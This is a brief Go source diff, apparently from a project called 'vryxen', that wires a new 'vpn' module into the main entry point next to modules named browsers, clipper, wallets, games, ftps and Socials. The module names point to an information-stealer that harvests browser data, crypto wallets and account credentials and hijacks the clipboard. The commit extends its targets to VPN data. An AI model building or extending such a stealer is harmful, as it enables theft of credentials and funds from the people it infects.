@@ -23,6 +23,7 @@ import (
 	"github.com/unf6/vryxen/internal/core/browsers"
 	"github.com/unf6/vryxen/internal/core/clipper"
 	"github.com/unf6/vryxen/internal/core/commonfiles"
+	"github.com/unf6/vryxen/internal/core/vpn"
 )
 
 func main() {
@@ -73,6 +74,7 @@ func main() {
 		wallets.Run,
 		games.Run,
 		ftps.Run,
+		vpn.Run,
 	}
 
 	Socials.Run()
